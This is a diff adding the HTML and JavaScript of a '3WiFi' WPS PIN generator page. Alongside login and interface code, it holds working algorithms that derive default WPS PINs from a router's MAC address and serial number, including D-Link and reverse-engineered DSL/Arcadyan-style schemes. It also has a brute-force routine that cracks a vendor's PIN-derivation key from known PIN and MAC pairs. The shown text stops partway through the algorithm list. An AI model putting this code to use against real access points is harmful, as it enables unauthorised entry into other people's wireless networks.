@@ -1,0 +1,2399 @@
+<html>
+<head>
+<title>3WiFi: WPS PIN generator</title>
+<meta http-equiv=Content-Type content="text/html;charset=UTF-8">
+<meta name="keywords" content="3wifi, wifi, router, scan, Router Scan, access point, map, internet, free"/>
+<link rel=stylesheet href="css/style.css?1654902327" type="text/css">
+<style type="text/css">
+body { margin: 0px }
+</style>
+<script src="js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript">
+function isMobile() 
+{ 
+	if (navigator.userAgent.match(/Android/i)
+	|| navigator.userAgent.match(/webOS/i)
+	|| navigator.userAgent.match(/iPhone/i)
+	|| navigator.userAgent.match(/iPad/i)
+	|| navigator.userAgent.match(/iPod/i)
+	|| navigator.userAgent.match(/BlackBerry/i)
+	|| navigator.userAgent.match(/Windows Phone/i)
+	|| navigator.userAgent.match(/Mobile/i))
+	{
+		return true;
+	}
+	if (window.innerWidth <= 800 && window.innerHeight <= 600)
+	{
+		return true;
+	}
+	return (('ontouchstart' in window) ||
+		(navigator.maxTouchPoints > 0) ||
+		(navigator.msMaxTouchPoints > 0));
+}
+
+function errorStr(error)
+{
+	switch (error)
+	{
+		case 'database':
+		return 'Database cannot handle request';
+		case 'loggedin':
+		return 'Already logged in';
+		case 'unauthorized':
+		return 'You are not authorized';
+		case 'loginfail':
+		return 'Wrong login or password';
+		case 'form':
+		return 'Some form fields are incorrect';
+		case 'invite':
+		return 'Wrong invitation code';
+		case 'login':
+		return 'Username already exists';
+		case 'nick':
+		return 'Nickname already exists';
+		case 'password':
+		return 'Password does not meet requirements';
+		case 'lowlevel':
+		return 'This function is inaccessible with your access level';
+		case 'limit':
+		return 'Usage limit is reached';
+		case 'token':
+		return 'Token is incorrect, clear your browser cache and try again';
+		case 'notfound':
+		return 'Not found';
+		case 'cooldown':
+		return 'Time limitation encountered, please try again';
+		default:
+		return 'Unknown error';
+	}
+}
+function banReasonStr(error)
+{
+	if (error in BanReasons)
+		return BanReasons[error];
+	else
+		return 'Unknown error';
+}
+function encodeHTML(str, spaces)
+{
+	str = $('<div>').text(str).html();
+	if (spaces) str = str.replace(/ /g, '&nbsp;');
+	return str;
+}
+function loadForm(frm, callback)
+{
+	if ($.trim($(frm).html()) != '')
+	{
+		callback();
+		return;
+	}
+	switch (frm)
+	{
+		case '#win_login':
+		case '#win_reg':
+		case '#win_newpass':
+		case '#win_wait':
+		$(frm).load('?fetch=' + frm.substr(1), function(response, status, xhr)
+		{
+			if (status == "error")
+			{
+				$(frm).html('');
+				return false;
+			}
+			callback();
+		});
+		break;
+	}
+}
+function showModal(frm)
+{
+	loadForm(frm, function()
+	{
+		$('#win_login').css({left: '-9999px'});
+		$('#win_reg').css({left: '-9999px'});
+		$('#win_newpass').css({left: '-9999px'});
+		$('#win_wait').css({left: '-9999px'});
+		if (frm == '#win_wait')
+		{
+			$(frm).css({left: '0'});
+			$(frm).css({top: '0'});
+			$(frm).css({width: '100%'});
+			$(frm).css({height: '100%'});
+			wait_sec = 10;
+			timeoutWaitSec();
+		}
+		else
+		{
+			$(frm).css({left: '50%'});
+			$(frm).css({top: '50%'});
+		}
+		$('.modal').show();
+		$('.modal').animate({opacity: 1}, 250);
+	});
+}
+function hideModal()
+{
+	$('.modal').animate({opacity: 0}, 250, function() { $('.modal').hide() });
+}
+function showFrm(frm)
+{
+	loadForm(frm, function()
+	{
+		var frm2 = (frm == '#win_login' ? '#win_reg' : '#win_login')
+		switch (Math.round(Math.random()*3))
+		{
+			case 0: // right to left
+			$(frm).css({left: '150%'});
+			$(frm).css({top: '50%'});
+			$(frm2).animate({left: '-50%'}, 500);
+			$(frm).animate({left: '50%'}, 500);
+			break;
+			case 1: // left to right
+			$(frm).css({left: '-50%'});
+			$(frm).css({top: '50%'});
+			$(frm2).animate({left: '150%'}, 500);
+			$(frm).animate({left: '50%'}, 500);
+			break;
+			case 2: // bottom to top
+			$(frm).css({left: '50%'});
+			$(frm).css({top: '150%'});
+			$(frm2).animate({top: '-50%'}, 500);
+			$(frm).animate({top: '50%'}, 500);
+			break;
+			case 3: // top to bottom
+			$(frm).css({left: '50%'});
+			$(frm).css({top: '-50%'});
+			$(frm2).animate({top: '150%'}, 500);
+			$(frm).animate({top: '50%'}, 500);
+			break;
+		}
+	});
+}
+function doLogin()
+{
+	var formdata = $('#frm_login').serialize();
+	$('#frm_login :input').prop('disabled', true);
+	$('#loginstat').html('<img src="img/loading.gif">');
+	$.post('user.php?a=login', formdata, function(json)
+	{
+		if (json.result)
+		{
+			$('#loginstat').html('<img src="img/ok.png" style="position: relative; top: 3px"> Login success!');
+			setTimeout($('#stayhere').prop('checked') ? (typeof refreshLocation == "function" ? 'refreshLocation();' : 'window.location.reload();') : 'window.location.href = \'user\';', 1000);
+		}
+		else
+		{
+			var errstr = (typeof json.error == 'string' ? json.error : '');
+			var err = '';
+			if (errstr == 'lowlevel')
+			{
+				err = 'Account is disabled. Reason: ';
+				if (json.inherited)
+					err += banReasonStr('inherit');
+				err += banReasonStr(json.reason);
+			}
+			else
+			{
+				err = errorStr(errstr);
+			}
+			$('#loginstat').html('<img src="img/no.png" style="position: relative; top: 3px"> ' + err);
+			$('#frm_login :input').prop('disabled', false);
+		}
+	});
+}
+function doLogout()
+{
+	var onFail = function(jqXHR, textStatus, errorThrown)
+	{
+		alert('No data received');
+	};
+	$.get('user.php?a=token', function(json)
+	{
+		if (!json.result)
+		{
+			alert(errorStr(json.error));
+			return;
+		} else {
+			var data = '';
+			data += '&token=' + encodeURIComponent(json.token);
+			$.get('user.php?a=logout' + data, function(json)
+			{
+				window.location.href = 'home';
+			});
+		}
+	}).fail(onFail);
+}
+function doReg()
+{
+	var formdata = $('#frm_reg').serialize();
+	$('#frm_reg :input').prop('disabled', true);
+	$('#regstat').html('<img src="img/loading.gif">');
+	$.post('user.php?a=reg', formdata, function(json)
+	{
+		if (json.result)
+		{
+			$('#checkinv').empty();
+			$('#regstat').html('<img src="img/ok.png" style="position: relative; top: 3px"> Registration success!');
+			setTimeout('window.location.href = \'user\';', 2000);
+		}
+		else
+		{
+			var errstr = (typeof json.error == 'string' ? json.error : '');
+			$('#regstat').html('<img src="img/no.png" style="position: relative; top: 3px"> ' + errorStr(errstr));
+			if (errstr == 'invite') $('#checkinv').html('<img src="img/no.png">');
+			$('#frm_reg :input').prop('disabled', false);
+		}
+	});
+}
+function doReturnView()
+{
+	var onFail = function(jqXHR, textStatus, errorThrown)
+	{
+		alert('No data received');
+	};
+	$.get('user.php?a=token', function(json)
+	{
+		if (!json.result)
+		{
+			alert(errorStr(json.error));
+			return false;
+		} else {
+			var postdata = '';
+			postdata += 'token=' + encodeURIComponent(json.token);
+			postdata += '&uid=0';
+			postdata += '&view=0';
+			$.post('user.php?a=setuser', postdata, function(json)
+			{
+				if (!json.result)
+				{
+					alert(errorStr(json.error));
+				}
+				else
+				{
+					window.location.reload();
+				}
+				return false;
+			}).fail(onFail);
+		}
+	}).fail(onFail);
+	return false;
+}
+function loginBtn(force)
+{
+	if (ProfileInfo.isUser == 0 || force)
+	{
+		showModal('#win_login');
+	} else {
+		doLogout();
+	}
+}
+function loginRequireMsg()
+{
+	return 'You are not authorized. <a href="javascript://" onclick="loginBtn(true)">Please login.</a>';
+}
+function getCookie(cname)
+{
+	var name = cname + "=";
+	var decodedCookie = decodeURIComponent(document.cookie);
+	var ca = decodedCookie.split(';');
+	for(var i = 0; i < ca.length; i++)
+	{
+		var c = ca[i];
+		while (c.charAt(0) == ' ')
+		{
+			c = c.substring(1);
+		}
+		if (c.indexOf(name) == 0)
+		{
+			return c.substring(name.length, c.length);
+		}
+	}
+	return "";
+}
+function delCookie(name)
+{
+	document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+}
+function getQueryStringValue(key)
+{
+	var k = encodeURIComponent(key).replace(/[\.\+\*]/g, "\\$&");
+
+	if (window.location.search.search("[\?&]" + k + "=") == -1)
+		return null;
+
+	return decodeURIComponent(window.location.search.replace(new RegExp("^(?:.*[&\\?]" + k + "(?:\\=([^&]*))?)?.*$", "i"), "$1"));
+}
+function settingsGetBool(name, def)
+{
+	var ret = localStorage.getItem(name);
+	return (ret == null ? def : (ret == 1));
+}
+function settingsSetBool(name, val)
+{
+	localStorage.setItem(name, (val ? '1':'0'));
+}
+function recheckCoordsLock()
+{
+	if (getCookie('uselocation') != '')
+	{
+		$('.coordlock').html('<img src="img/icon-location.png"/> Location locked &nbsp;<button class=delcoord>Reset</button>');
+		$('button.delcoord').click(function ()
+		{
+			if (!confirm('Reset current location?')) return false;
+			delCookie('uselocation');
+			if (getCookie('uselocation') == '')
+			{
+				$('.coordlock').html('');
+				delCoordCallback();
+			}
+		});
+	}
+	else
+		$('.coordlock').html('');
+}
+
+var ProfileInfo = {isUser: 0, Nickname: "", Level: -1, invites: 0, viewUser: ""};
+var BanReasons = {"guest":"Guest account is <a href=\"https:\/\/forum.antichat.ru\/posts\/4370935\" target=\"_blank\">temporarily disabled<\/a>","parsing":"Mass download \/ parsing attempt \/ high load","commerce":"Commercial use","public":"Creation of public account","inherit":"The user who invited you was banned \u2014 ","weak":"Security issue \u2014 your login or password is weak","left":"You are no longer in community","contact":"Ask for help in Router Scan telegram chat"};
+
+function initmenu()
+{
+	if (this != top)
+	{
+		top.location.href = this.location.href;
+	}
+
+	if (ProfileInfo.isUser == 0)
+	{
+		$('a[href=user]').hide();
+	}
+	else if (ProfileInfo.viewUser != '')
+	{
+		var str = $('#returnbtn > p').html();
+		str = str.replace(/%username%/g, encodeHTML(ProfileInfo.viewUser));
+		$('#returnbtn > p').html(str);
+		$($('a[href=user]')[0]).hide().next().show();
+	}
+
+	if (!isMobile())
+	{
+		$('.multi').mouseenter(function()
+		{
+			$(this.children[1]).show();
+		}).mouseleave(function()
+		{
+			$(this.children[1]).hide();
+		});
+	}
+	else
+	{
+		$('.multi').click(function()
+		{
+			if(!this.children[1].isDoubleTap)
+			{
+				this.children[1].isDoubleTap = true;
+				$(this.children[1]).show();
+				return false;
+			}
+			$(this.children[1]).hide();
+			this.children[1].isDoubleTap = false;
+			return true;
+		});
+	}
+	recheckCoordsLock();
+}
+</script>
+
+<script type="text/javascript">
+function zeroFill(number, width)
+{
+	width -= number.toString().length;
+	if (width > 0)
+	{
+		return new Array(width + (/\./.test( number ) ? 2 : 1)).join('0') + number;
+	}
+	return number + ""; // always return a string
+}
+function reverse(s)
+{
+	return s.split("").reverse().join("");
+}
+function insert(a, b, position)
+{
+	return [a.slice(0, position), b, a.slice(position)].join('');
+}
+function pinChecksum(pin)
+{
+	pin %= 10000000;
+	var a = 0, t = pin;
+	while (t)
+	{
+		a += 3 * (t % 10);
+		t = Math.floor(t / 10);
+		a += t % 10;
+		t = Math.floor(t / 10);
+	}
+	return (pin * 10) + ((10 - (a % 10)) % 10);
+}
+function genPin(mac, sn, i)
+{
+	return (algos[i].mode == ALGO_MACSN ? algos[i].func(mac, sn) : algos[i].func(mac));
+}
+function pinSuggestAPI(getAll, bssid, sn)
+{
+	var result = [];
+	var mac = bssid.replace(/:/g, '').replace(/-/g, '').replace(/\./g, '').replace(/ /g, '');
+	mac = parseInt(mac, 16);
+	if (isNaN(mac) || mac > 0xFFFFFFFFFFFF) return result;
+
+	for (var i = 0; i < algos.length; i++)
+	{
+		var match = getAll;
+
+		if (!getAll)
+		{
+			var info = document.getElementById(algos[i].id).value.split("\n");
+			for (var k = 0; k < info.length; k++)
+			{
+				if (info[k].indexOf('  ') == 0 && info[k].lastIndexOf(':xx') == 16)
+				{
+					info[k] = info[k].substr(2);
+					info[k] = info[k].substr(0, info[k].indexOf('x'));
+					match = bssid.indexOf(info[k]) == 0;
+					if (match) break;
+				}
+			}
+		}
+		if (match)
+		{
+			var pin = genPin(mac, sn, i);
+			if (typeof pin != 'string')
+			{
+				pin = pinChecksum(pin);
+				pin = zeroFill(pin.toString(10), 8);
+			}
+			result.push({pin: pin, algo: i});
+		}
+	}
+	return result;
+}
+function pinSuggest()
+{
+	$('#result').empty();
+	var ln = $('#bssids').val().replace(/^\s+|\s+$/g, '').split("\n");
+	for (var j = 0; j < ln.length; j++)
+	{
+		var m = ln[j];
+		var z = m.split('|');
+		m = z[0];
+		m = m.replace(/:/g, '').replace(/-/g, '').replace(/\./g, '').replace(/ /g, '');
+		m = parseInt(m, 16);
+		if (isNaN(m) || m > 0xFFFFFFFFFFFF) continue;
+		var mt = zeroFill(m.toString(16).toUpperCase(), 12);
+		mt = insert(mt, ':', 10);
+		mt = insert(mt, ':', 8);
+		mt = insert(mt, ':', 6);
+		mt = insert(mt, ':', 4);
+		mt = insert(mt, ':', 2);
+		$('#suggpin').text("Suggested PIN codes for "+mt+"\n\n");
+		var sugg = pinSuggestAPI(false, mt, z[1]);
+		for (var i = 0; i < sugg.length; i++)
+		{
+			var pin = sugg[i].pin;
+			if (pin == '')
+				pin = '<empty>';
+			pin = pin.padEnd(8);
+
+			if (algos[sugg[i].algo].mode == ALGO_STATIC)
+			{
+				$('#suggpin').append(encodeHTML(pin, true) + ' | Static PIN - ' + algos[sugg[i].algo].name + "\n");
+			} else {
+				$('#suggpin').append(encodeHTML(pin, true) + ' | ' + algos[sugg[i].algo].name + "\n");
+			}
+		}
+		if (sugg.length > 0) $('#result').append(encodeHTML($('#suggpin').val()) + "\n");
+	}
+	$('#algosel').val('algonone');
+}
+function getAll()
+{
+	var m = $('#bssids').val().replace(/^\s+|\s+$/g, '').split("\n");
+	if (m.length > 1)
+		return alert('This function only for one BSSID.');
+	var bss = m[0].replace(/ /g, '').toUpperCase();
+	var z = m[0].split('|');
+	m[0] = z[0];
+	m = m[0].replace(/:/g, '').replace(/-/g, '').replace(/\./g, '').replace(/ /g, '');
+	m = parseInt(m, 16);
+	if (isNaN(m) || m > 0xFFFFFFFFFFFF)
+		return alert('Incorrect BSSID.');
+	$('#result').text("PIN codes for "+bss+"\n\n");
+	var res = pinSuggestAPI(true, bss, z[1]);
+	for (var i = 0; i < res.length; i++)
+	{
+		var pin = res[i].pin;
+		if (pin == '')
+			pin = '<empty>';
+		pin = pin.padEnd(8);
+
+		if (algos[res[i].algo].mode == ALGO_STATIC)
+		{
+			$('#result').append(encodeHTML(pin, true) + ' | Static PIN - ' + algos[res[i].algo].name + "\n");
+		} else {
+			$('#result').append(encodeHTML(pin, true) + ' | ' + algos[res[i].algo].name + "\n");
+		}
+	}
+	$('#algosel').val('algonone');
+}
+function showAlgo()
+{
+	var algo = $('#algosel').val();
+	$('#result').empty();
+	for (var i = 0; i < algos.length; i++)
+	{
+		if (algos[i].id == algo)
+		{
+			switch (algos[i].mode)
+			{
+			case ALGO_MAC:
+			case ALGO_MACSN:
+				$('#result').append(algos[i].name + " algorithm,\n");
+				break;
+			case ALGO_STATIC:
+				$('#result').append(algos[i].name + " static PIN,\n");
+				break;
+			case ALGO_EMPTY:
+				$('#result').append(algos[i].name + ",\n");
+				break;
+			}
+			$('#result').append("used by these devices:\n\n");
+			$('#result').append($('#' + algos[i].id).val());
+			break;
+		}
+	}
+}
+function checkDSLkeys(keys)
+{
+	if (keys.length > 0)
+	{
+		if (keys.length == 1)
+		{
+			keys = keys[0];
+
+			var amb = false;
+			for (var i = 0; i < keys.length; i++)
+				if (keys[i].length > 1)
+				{
+					amb = true;
+					break;
+				}
+			if (amb)
+			{
+				$('#result').append("[*] Found key is ambiguous, specify more data.\n");
+				return false;
+			}
+			else
+			{
+				$('#result').append("[+] Key found: "+keys.reverse().join(', ')+"\n");
+				return true;
+			}
+		}
+		else
+		{
+			$('#result').append("[*] Too many keys (" + keys.length + "), specify more data.\n");
+			return false;
+		}
+	}
+	else
+	{
+		$('#result').append("[-] No keys found, algorithm seems unapplicable.\n");
+		return false;
+	}
+}
+function runDSLcrack(data, bss_offset, sn_offset)
+{
+	if (bss_offset == 0 && sn_offset == 0)
+	{
+		$('#result').append("[*] Using straight mode...\n");
+	}
+	else
+	{
+		var a = [];
+		if (bss_offset > 0)
+			a.push("BSSID + " + bss_offset);
+		if (bss_offset < 0)
+			a.push("BSSID - " + (-bss_offset));
+		if (sn_offset > 0)
+			a.push("SN[-" + sn_offset + "]");
+		if (sn_offset == -1)
+			a.push("derived SN (dec)");
+		if (sn_offset == -2)
+			a.push("derived SN (hex)");
+		$('#result').append("[*] Using mode " + a.join(', ') + "...\n");
+		for (var i = 0; i < data.length; i++)
+		{
+			if (bss_offset != 0)
+				data[i][1] += bss_offset;
+			if (sn_offset > 0)
+				data[i][2] = data[i][2].substr(0, data[i][2].length - sn_offset);
+			if (sn_offset == -1)
+				data[i][2] = (data[i][1] & 0xFFFF).toString(10);
+			if (sn_offset == -2)
+				data[i][2] = (data[i][1] & 0xFFFF).toString(16);
+		}
+	}
+	var DSL_keys = intersect_pairs(data);
+	return checkDSLkeys(DSL_keys);
+}
+function unreference(obj)
+{
+	return JSON.parse(JSON.stringify(obj));
+}
+function crackAlgo()
+{
+	$('#result').empty();
+	var ln = $('#bssids').val().replace(/^\s+|\s+$/g, '').split("\n");
+	var pairs = [];
+	for (var j = 0; j < ln.length; j++)
+	{
+		var m = ln[j];
+		var z = m.split('|');
+		m = z[0];
+		m = m.replace(/:/g, '').replace(/-/g, '').replace(/\./g, '').replace(/ /g, '');
+		m = parseInt(m, 16);
+		if (isNaN(m) || m > 0xFFFFFFFFFFFF) continue;
+		pairs.push([Math.floor(parseInt(z[1]) / 10), m, (z[2] == null ? '' : z[2])]);
+		if (z[1] == '')
+			z[1] = '<empty>';
+		var mt = zeroFill(m.toString(16).toUpperCase(), 12);
+		mt = insert(mt, ':', 10);
+		mt = insert(mt, ':', 8);
+		mt = insert(mt, ':', 6);
+		mt = insert(mt, ':', 4);
+		mt = insert(mt, ':', 2);
+		var sugg = false;
+		$('#suggpin').empty();
+		for (var i = 0; i < algos.length; i++)
+		{
+			var pin = genPin(m, z[2], i);
+			if (typeof pin == 'string')
+			{
+				if (pin == '')
+					pin = '<empty>';
+			} else {
+				pin = pinChecksum(pin);
+				pin = zeroFill(pin.toString(10), 8);
+			}
+			if (z[1] == pin)
+			{
+				$('#suggpin').append(mt+" - "+z[1].padEnd(8)+" - "+algos[i].name);
+				sugg = true;
+			}
+		}
+		if (sugg) $('#result').append(encodeHTML($('#suggpin').val()) + "\n");
+	}
+	if (pairs.length > 1)
+	{
+		$('#result').append("\nDSL derivation algorithm cracker:\n");
+
+		var result = runDSLcrack(unreference(pairs), 0, 0); // try without offset
+		if (!result)
+			result = runDSLcrack(unreference(pairs), 0, -1); // try derived S/N (decimal)
+		if (!result)
+			result = runDSLcrack(unreference(pairs), 0, -2); // try derived S/N (hexadecimal)
+		if (!result)
+			result = runDSLcrack(unreference(pairs), 0, 1); // cut last S/N char
+		if (!result)
+			result = runDSLcrack(unreference(pairs), 0, 2); // cut 2 last S/N chars
+		if (!result)
+		{
+			// try offset BSSID -1..-4
+			for (var i = 0; i < 4; i++)
+			{
+				result = runDSLcrack(unreference(pairs), - i - 1, 0);
+				if (result) break;
+			}
+		}
+		if (!result)
+		{
+			// try offset BSSID +1..+4
+			for (var i = 0; i < 4; i++)
+			{
+				result = runDSLcrack(unreference(pairs), i + 1, 0);
+				if (result) break;
+			}
+		}
+		if (!result)
+		{
+			// mixed BSSID & S/N offset
+			for (var i = 0; i < 4; i++)
+			for (var j = 0; j < 4; j++)
+			{
+				result = runDSLcrack(unreference(pairs), - i - 1, (j < 2 ? - j - 1 : j - 1));
+				if (result) break;
+			}
+		}
+		if (!result)
+		{
+			// mixed BSSID & S/N offset
+			for (var i = 0; i < 4; i++)
+			for (var j = 0; j < 4; j++)
+			{
+				result = runDSLcrack(unreference(pairs), i + 1, (j < 2 ? - j - 1 : j - 1));
+				if (result) break;
+			}
+		}
+	}
+	$('#algosel').val('algonone');
+}
+function detect()
+{
+	var formdata = $($('form')[0]).serialize();
+	$('input').prop('disabled', true);
+	$('button').prop('disabled', true);
+	$('#fdata').empty();
+	$('#fhead').empty();
+	$('#fhead').append('<tr><th>Algorithm</th><th>WPS PIN</th><th>Notes</th><th>Probability</th></tr>');
+	$('#fdata').append('<tr><td colspan=4><img src="img/loading.gif"></td></tr>');
+
+	$.post('3wifi.php?a=wpspin', formdata, function(d)
+	{
+		$('input').prop('disabled', false);
+		$('button').prop('disabled', false);
+		if (!d.result)
+		{
+			if (d.error == 'unauthorized')
+			{
+				$('#fdata > tr:first-child > :first-child').html(loginRequireMsg());
+			}
+			else if (d.error == 'bssid')
+			{
+				$('#fdata > tr:first-child > :first-child').text('Incorrect BSSID.');
+			}
+			else
+			{
+				$('#fdata > tr:first-child > :first-child').text(errorStr(d.error));
+			}
+			return;
+		}
+		if (d.scores.length > 0)
+		{
+			$('#fdata').empty();
+			for (var i = 0; i < d.scores.length; i++)
+			{
+				var info = '';
+				var pin = d.scores[i].value;
+				if (d.scores[i].fromdb)
+					info += '<img src="img/ok.png" title="AP from database"/>';
+				if (pinChecksum(Math.floor(pin / 10)) != pin)
+					info += ' <img src="img/icon-warning.png" title="Non-standart PIN (wrong checksum)"/>';
+				$('#fdata').append('<tr><td>'+d.scores[i].name+'</td><td>'+pin+'</td><td>'+info+'</td><td style="text-align: left"><span class=perc></span><b>&nbsp; '+Math.round(d.scores[i].score * 100)+'%</b></td></tr>');
+				var perc = $('.perc:last');
+				var wid = 180;
+				perc.css('width', wid + 'px');
+				var chld = $('<span class=perc-data>');
+				chld.css('width', Math.round(d.scores[i].score * 100) + '%');
+				perc.html(chld);
+			}
+		} else {
+			$('#fdata > tr:first-child > :first-child').text('No matched devices and/or algorithms found.');
+		}
+	}).fail(function(jqXHR, textStatus, errorThrown) {
+		$('#fdata > tr:first-child > :first-child').text('No data received.');
+		$('input').prop('disabled', false);
+		$('button').prop('disabled', false);
+	});
+}
+function algoDLink(mac)
+{
+	mac &= 0xFFFFFF;
+	mac ^= 0x55AA55;
+	mac ^= ((mac & 0xF) << 4)
+	| ((mac & 0xF) << 8)
+	| ((mac & 0xF) << 12)
+	| ((mac & 0xF) << 16)
+	| ((mac & 0xF) << 20);
+	mac %= 10000000;
+	if (mac < 1000000) mac += ((mac % 9) * 1000000) + 1000000;
+	return mac;
+}
+function algoDSL_MAC_SN(mac, ser, init)
+{
+	/*
+		universal algorithm, returns pin derived from MAC and S/N
+		used by: Belkin, DSL-EasyBox, Arcadyan, and possibly other manufacturers
+
+		reverse-engineered by Stas'M
+	*/
+	if (ser == null)
+		ser = '';
+	if (ser.length < 4)
+		ser = zeroFill(ser, 4);
+	if (ser.length > 4)
+		ser = ser.substr(-4);
+	var sn = [];
+	for (var i = 0; i < ser.length; i++)
+	{
+		x = parseInt(ser[i], 16);
+		if (isNaN(x)) x = 0;
+		sn.push(x);
+	}
+	var nic = [(mac & 0xFFFF) >> 12, (mac & 0xFFF) >> 8, (mac & 0xFF) >> 4, mac & 0xF];
+
+	/*
+		init vector:
+		bk1  - k1 sum composite bits (0~255)
+		bk2  - k2 sum composite bits (0~255)
+		bx[] - xor composite bits (array of 0~255)
+		k1   - k1 init nibble (0~15)
+		k2   - k2 init nibble (0~15)
+		pin  - pin init value (0~9999999)
+		xor  - xor init nibble (0~15)
+		sub  - substraction mode (0 - no sub, 1 - substraction, 2 - addition)
+		sk   - substraction multiple coefficient (0 - skv value, 1 - k1, 2 - k2)
+		skv  - substraction multiple value
+	*/
+	if (init.bk1 == null) init.bk1 = 60;
+	if (init.bk2 == null) init.bk2 = 195;
+	if (init.k1 == null) init.k1 = 0;
+	if (init.k2 == null) init.k2 = 0;
+	if (init.pin == null) init.pin = 0;
+	if (init.xor == null) init.xor = 0;
+	if (init.sub == null) init.sub = 0;
+	if (init.sk == null) init.sk = 0;
+	if (init.skv == null) init.skv = 0;
+
+	var k1 = init.k1 & 0xF;
+	var i = 0;
+	while (init.bk1)
+	{
+		// 0      1      2      3      4     5     6     7
+		// nic[0] nic[1] nic[2] nic[3] sn[0] sn[1] sn[2] sn[3]
+		if (init.bk1 & 1)
+		{
+			k1 += (i < 4 ? nic[i] : sn[i - 4]);
+			k1 &= 0xF;
+		}
+		init.bk1 >>= 1;
+		i++;
+	}
+	var k2 = init.k2 & 0xF;
+	i = 0;
+	while (init.bk2)
+	{
+		// 0      1      2      3      4     5     6     7
+		// nic[0] nic[1] nic[2] nic[3] sn[0] sn[1] sn[2] sn[3]
+		if (init.bk2 & 1)
+		{
+			k2 += (i < 4 ? nic[i] : sn[i - 4]);
+			k2 &= 0xF;
+		}
+		init.bk2 >>= 1;
+		i++;
+	}
+
+	var pin = init.pin;
+	for (var j = 0; j < init.bx.length; j++)
+	{
+		var xor = init.xor & 0xF;
+		i = 0;
+		while (init.bx[j])
+		{
+			// 0   1   2       3       4       5      6      7
+			// k1, k2, nic[1], nic[2], nic[3], sn[1], sn[2], sn[3]
+			if (init.bx[j] & 1)
+			{
+				xor ^= (i > 4 ? sn[i - 4] : (i > 1 ? nic[i - 1] : (i > 0 ? k2 : k1)));
+			}
+			init.bx[j] >>= 1;
+			i++;
+		}
+		pin <<= 4;
+		pin |= xor;
+	}
+	switch (init.sub)
+	{
+		case 0: // by default
+		return pin % 10000000;
+		case 1: // spoiled from Belkin's reversed algo
+		return (pin % 10000000) - (Math.floor(pin / 10000000) * (init.sk > 1 ? k2 : (init.sk > 0 ? k1 : init.skv)));
+		case 2:
+		return (pin % 10000000) + (Math.floor(pin / 10000000) * (init.sk > 1 ? k2 : (init.sk > 0 ? k1 : init.skv)));
+	}
+}
+function get_combs(nibs, nic, sn)
+{
+	/*
+		part of key cracking algorithm for universal DSL algorithm (that derives pin from MAC and S/N)
+
+		programmed by Stas'M in 2017-10-23
+	*/
+	var combs = [];
+	// loop through 7 nibbles
+	for (var i = 0; i < 7; i++)
+	{
+		combs[i] = [];
+		// get nibble
+		var nib = nibs & 0xF;
+		// brute-force xor combinations
+		for (var j = 0; j < 256; j++)
+		{
+			if (algoDSL_MAC_SN(nic, sn, {bx: [0, 0, 0, 0, 0, 0, j]}) == nib)
+				combs[i].push(j); // match
+		}
+		if (combs[i].length == 0)
+			return false; // some of nibbles is not affected by algorithm
+		nibs >>= 4;
+	}
+	return combs;
+}
+function get_all_combs(pin, nic, sn)
+{
+	/*
+		part of key cracking algorithm for universal DSL algorithm (that derives pin from MAC and S/N)
+
+		programmed by Stas'M in 2017-10-23
+	*/
+
+	// get all possible xor combinations
+	var pns = [];
+	// pin should contain 7 nibbles
+	while (pin < 0x10000000)
+	{
+		// get all possible xor combinations
+		var x = get_combs(pin, nic, sn);
+		if (x != false)
+			pns.push(x);
+		// actual pin is modulus of 10000000
+		pin += 10000000;
+	}
+	// only one of combination tables is correct
+	return pns;
+}
+function intersect(a, b)
+{
+	return a.filter((n) => b.includes(n));
+}
+function intersect_combs(a, b)
+{
+	var c = [];
+	for (var i = 0; i < 7; i++)
+	{
+		var x = intersect(a[i], b[i]);
+		if (x.length == 0)
+			return false;
+		c[i] = x;
+	}
+	return c;
+}
+function intersect_pairs(pairs)
+{
+	/*
+		part of key cracking algorithm for universal DSL algorithm (that derives pin from MAC and S/N)
+
+		programmed by Stas'M in 2017-10-23
+	*/
+
+	// assuming first pair is correct (have a key)
+	var c0 = get_all_combs(pairs[0][0], pairs[0][1], pairs[0][2]);
+	for (var i = 1; i < pairs.length; i++)
+	{
+		var c1 = get_all_combs(pairs[i][0], pairs[i][1], pairs[i][2]);
+		var c2 = [];
+		// collide combs with each other
+		for (var j = 0; j < c0.length; j++)
+		for (var k = 0; k < c1.length; k++)
+		{
+			var x = intersect_combs(c0[j], c1[k]);
+			if (x == false)
+				continue;
+			c2.push(x);
+		}
+		c0 = c2;
+	}
+	return c0;
+}
+function initAlgos()
+{
+	ALGO_MAC = 0;
+	ALGO_MACSN = 1;
+	ALGO_EMPTY = 2;
+	ALGO_STATIC = 3;
+
+	algos = [];
+	algos.push({id: "pin24", name: "24-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac & 0xFFFFFF;}});
+	algos.push({id: "pin28", name: "28-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac & 0xFFFFFFF;}});
+	algos.push({id: "pin32", name: "32-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac % 0x100000000;}});
+	algos.push({id: "pin36", name: "36-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac % 0x1000000000;}});
+	algos.push({id: "pin40", name: "40-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac % 0x10000000000;}});
+	algos.push({id: "pin44", name: "44-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac % 0x100000000000;}});
+	algos.push({id: "pin48", name: "48-bit PIN", mode: ALGO_MAC, func: function (mac) {return mac;}});
+	algos.push({id: "pin24rh", name: "Reverse byte 24-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac &= 0xFFFFFF;
+		mac = zeroFill(mac.toString(16), 6);
+		mac = mac.substr(4,2)
+		+ mac.substr(2,2)
+		+ mac.substr(0,2);
+		return parseInt(mac, 16);
+	}});
+	algos.push({id: "pin32rh", name: "Reverse byte 32-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac %= 0x100000000;
+		mac = zeroFill(mac.toString(16), 8);
+		mac = mac.substr(6,2)
+		+ mac.substr(4,2)
+		+ mac.substr(2,2)
+		+ mac.substr(0,2);
+		return parseInt(mac, 16);
+	}});
+	algos.push({id: "pin48rh", name: "Reverse byte 48-bit", mode: ALGO_MAC, func: function (mac)
+	{
+		mac = zeroFill(mac.toString(16), 12);
+		mac = mac.substr(10,2)
+		+ mac.substr(8,2)
+		+ mac.substr(6,2)
+		+ mac.substr(4,2)
+		+ mac.substr(2,2)
+		+ mac.substr(0,2);
+		return parseInt(mac, 16);
+	}});
